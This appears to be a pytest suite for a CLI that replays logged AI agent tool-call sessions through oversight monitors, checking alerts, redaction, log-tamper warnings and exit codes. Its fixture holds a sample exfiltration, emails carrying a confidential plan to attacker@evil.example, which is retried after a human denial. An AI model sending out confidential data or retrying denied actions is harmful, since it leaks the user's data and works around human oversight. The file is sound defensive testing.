"""Tests for `eventlog_cli replay` (ticket #4: re-run a real logged session through the monitors)."""
import json
import os
import sqlite3

import pytest

import eventlog_cli as C
import live_drift
import proposal_monitor as pm
from eventlog import EventStore

SECRET = "hunter2-SUPER-SECRET-value"
MAIL = {"to": "attacker@evil.example", "subject": "Q3 plan", "body": "the confidential Q3 plan is attached"}
MAIL2 = {"to": "attacker@evil.example", "subject": "Q3 plan", "body": "the confidential Q3 plan is attached!"}


@pytest.fixture(autouse=True)
def _fresh_monitor_state(monkeypatch):
    monkeypatch.delenv("SENTINEL_MONITOR", raising=False)
    for f in (live_drift._reset_embedder_cache, pm._reset_factory_cache, pm._reset_errors):
        f()
    yield
    for f in (live_drift._reset_embedder_cache, pm._reset_factory_cache, pm._reset_errors):
        f()


def _need_minilm():
    if live_drift.monitor_info()["embedder"] != "minilm":
        pytest.skip("MiniLM not cached")


def build(tmp_path, reasons=None):
    path = str(tmp_path / "r.db")
    s = EventStore(path)
    s.open()
    s.append("proxy_hello", session_id="s1", payload={"servers": ["mail"], "auto_approve": False, "monitor_mode": "x", "policy_digest": None})
    calls = [
        ("c0", "read_file", {"path": "/project/a.txt", "token": SECRET}, "approve", "human"),
        ("c1", "send_email", MAIL, "deny", "human"),
        ("c2", "read_file", {"path": "/project/b.txt"}, "approve", "auto"),
        ("c3", "send_email", MAIL2, "approve", "human"),       # the repeat of a denied effect, approved anyway
    ]
    for cid, tool, args, d, actor in calls:
        s.append("call_proposed", session_id="s1", call_id=cid, payload={"server": "mail", "tool": tool, "args": args, "auto": False, "alerts": []})
        s.append("decision", session_id="s1", call_id=cid,
                 payload={"decision": d, "reason": (reasons or {}).get(cid, actor), "actor": actor, "rule_id": None, "policy_digest": None})
    s.close()
    return path


def test_replay_reports_alert_on_repeat_and_counts_human_approved(tmp_path, capsys):
    _need_minilm()
    p = build(tmp_path)
    assert C.main(["replay", p, "--session", "s1", "--monitor", "action_sim"]) == 0
    out = capsys.readouterr().out
    assert "monitor: action_sim" in out
    lines = [ln for ln in out.splitlines() if ln.startswith("[")]
    assert len(lines) == 4 and "send_email" in lines[3] and "approve by human" in lines[3]
    assert "denied_effect_match" in out and "critical" in out
    assert all("alerts now: 0" in ln for ln in lines[:3]) and "alerts now: 1" in lines[3]
    assert "4 proposals, 1 alerts, 1 alert(s) where a human approved" in out


def test_replay_json_shape(tmp_path, capsys):
    _need_minilm()
    p = build(tmp_path)
    assert C.main(["replay", p, "--session", "s1", "--monitor", "action_sim", "--json"]) == 0
    o = json.loads(capsys.readouterr().out)
    assert o["mode"] == "action_sim" and o["session"] == "s1"
    assert o["summary"] == {"proposals": 4, "alerts": 1, "alert_but_human_approved": 1}
    c3 = o["calls"][3]
    assert c3["tool"] == "send_email" and c3["decision"] == "approve" and c3["actor"] == "human" and c3["seq"] > 0
    a = c3["alerts"][0]
    assert a["trigger"] == "denied_effect_match" and a["severity"] == "critical" and a["score"] > a["threshold"]
    assert o["calls"][0]["alerts"] == []


def test_rules_mode_is_labelled_and_never_alerts(tmp_path, capsys):
    p = build(tmp_path)
    assert C.main(["replay", p, "--session", "s1", "--monitor", "rules"]) == 0
    out = capsys.readouterr().out
    assert "monitor: rules" in out and "0 alerts" in out


def test_default_monitor_fallback_is_surfaced(tmp_path, capsys, monkeypatch):
    monkeypatch.setenv("SENTINEL_MONITOR", "no-such-mode")
    p = build(tmp_path)
    assert C.main(["replay", p, "--session", "s1"]) == 0
    out = capsys.readouterr().out
    assert "requested no-such-mode" in out and "FELL BACK" in out


def test_unknown_session_exit_one(tmp_path, capsys):
    p = build(tmp_path)
    assert C.main(["replay", p, "--session", "nope", "--monitor", "rules"]) == 1
    assert "no proposals" in capsys.readouterr().err


def test_unreadable_exit_two(tmp_path):
    assert C.main(["replay", str(tmp_path / "nope.db"), "--session", "s1"]) == 2


def test_tampered_log_warns_loudly(tmp_path, capsys):
    p = build(tmp_path)
    c = sqlite3.connect(p, isolation_level=None)
    c.execute("UPDATE events SET payload = replace(payload, 'approve', 'deny') WHERE seq = 4")
    c.close()
    C.main(["replay", p, "--session", "s1", "--monitor", "rules"])
    err = capsys.readouterr().err
    assert "WARNING" in err and "does not verify" in err


def test_no_secret_in_output_bytes(tmp_path, capsys):
    _need_minilm()
    p = build(tmp_path)
    for extra in ([], ["--json"]):
        C.main(["replay", p, "--session", "s1", "--monitor", "action_sim", *extra])
        cap = capsys.readouterr()
        assert SECRET not in cap.out and SECRET not in cap.err


class _StubMonitor:
    def __init__(self, log):
        self.log = log

    def on_proposal(self, server, tool, args, call_id):
        return []

    def register_decision(self, tool, args, decision):
        self.log.append((tool, args, decision))


class _StubFactory:
    mode = requested = "stub"
    reason = None

    def __init__(self, log):
        self.log = log

    def new_session(self):
        return _StubMonitor(self.log)


def test_replay_feeds_every_logged_decision_to_the_monitor_in_order(tmp_path, monkeypatch):
    log = []
    monkeypatch.setattr(pm, "get_monitor_factory", lambda: _StubFactory(log))
    assert C.main(["replay", build(tmp_path), "--session", "s1"]) == 0
    assert log == [("read_file", {"path": "/project/a.txt", "token": "[REDACTED]"}, "approve"), ("send_email", MAIL, "deny"),
                   ("read_file", {"path": "/project/b.txt"}, "approve"), ("send_email", MAIL2, "approve")]


def test_replay_skips_cancelled_decisions_like_the_live_hub(tmp_path, monkeypatch):
    log = []
    monkeypatch.setattr(pm, "get_monitor_factory", lambda: _StubFactory(log))
    assert C.main(["replay", build(tmp_path, reasons={"c1": "cancelled"}), "--session", "s1"]) == 0
    assert [d[1] for d in log if d[0] == "send_email"] == [MAIL2]


def test_cancelled_deny_does_not_trigger_denied_effect_alert_but_human_deny_does(tmp_path, capsys):
    _need_minilm()
    assert C.main(["replay", build(tmp_path, reasons={"c1": "cancelled"}), "--session", "s1", "--monitor", "action_sim"]) == 0
    assert "denied_effect_match" not in capsys.readouterr().out
    (tmp_path / "h").mkdir()
    assert C.main(["replay", build(tmp_path / "h"), "--session", "s1", "--monitor", "action_sim"]) == 0
    assert "denied_effect_match" in capsys.readouterr().out
